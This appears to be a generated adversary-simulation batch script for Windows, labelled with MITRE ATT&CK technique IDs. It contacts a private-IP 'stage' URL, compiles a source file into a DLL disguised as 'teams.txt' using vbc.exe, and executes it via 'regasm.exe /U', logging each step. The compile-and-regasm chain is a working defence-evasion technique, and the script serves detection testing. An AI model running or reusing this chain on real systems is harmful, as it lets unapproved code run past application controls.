@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\7836\f0832785
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?7836-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=7836

REM Log file path
SET uetbmo=%APPDATA%\!ufeybybm!\macula-simulations.log

REM Full path to .NET utilities
SET xrwitm=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
SET sffaxr=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe

REM Create log directory
IF NOT EXIST "%APPDATA%\!ufeybybm!\" mkdir "%APPDATA%\!ufeybybm!" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_start>>> "!uetbmo!" 2>nul

REM === TTP T1218.005: Signed Binary Proxy Execution ===
REM Step 1: Server heartbeat check via curl (lolbin usage)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start>>> "!uetbmo!" 2>nul
SET /A ghyuai=0
curl -k -s -o nul "!uouoq!" && SET /A ghyuai=1
IF !ghyuai! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_success>>> "!uetbmo!" 2>nul
    SET nhxcae=1
    SET ltxbam=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_failed>>> "!uetbmo!" 2>nul
    SET nhxcae=0
    SET ltxbam=connection_refused
)
FOR /F "tokens=2-4 delims=/ " %%a IN ('echo !DATE!') DO SET iyxhqd=%%c-%%a-%%b
SET cqkavh=!iyxhqd! !TIME:.=,!
SET cqkavh=!cqkavh:,=.! 
echo [!cqkavh!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218.005|Signed_Binary_Proxy_Execution=!nhxcae!:!ltxbam!>> "!uetbmo!" 2>nul || ver >nul

REM Step 2: Change to output directory
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>>> "!uetbmo!" 2>nul
cd /d "!recnn!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_success>>> "!uetbmo!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_failed>>> "!uetbmo!" 2>nul
)

REM === TTP T1500: Compile and Load .NET Assembly ===
REM Step 3: Compile .NET source to DLL
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>>> "!uetbmo!" 2>nul
SET /A hbxwaf=0
"!xrwitm!" /target:library "!njozco!" /out:"!hpnjatpj!" >nul 2>&1 && SET /A hbxwaf=1
IF !hbxwaf! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_success>>> "!uetbmo!" 2>nul
    SET kqesqc=1
    SET cokbrw=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_failed>>> "!uetbmo!" 2>nul
    SET kqesqc=0
    SET cokbrw=compilation_error
)
SET iyxhqd=
FOR /F "tokens=2-4 delims=/ " %%a IN ('echo !DATE!') DO SET iyxhqd=%%c-%%a-%%b
SET cqkavh=!iyxhqd! !TIME:.=,!
SET cqkavh=!cqkavh:,=.!
echo [!cqkavh!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile_and_Load_.NET_Assembly=!kqesqc!:!cokbrw!>> "!uetbmo!" 2>nul || ver >nul

REM Step 4: Execute DLL via regasm.exe /U (T1218.005 continuation)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_start>>> "!uetbmo!" 2>nul
SET /A gvnvpl=0
"!sffaxr!" /U "!hpnjatpj!" >nul 2>&1 && SET /A gvnvpl=1
IF !gvnvpl! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_success>>> "!uetbmo!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_failed>>> "!uetbmo!" 2>nul
)

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_end>>> "!uetbmo!" 2>nul

ENDLOCAL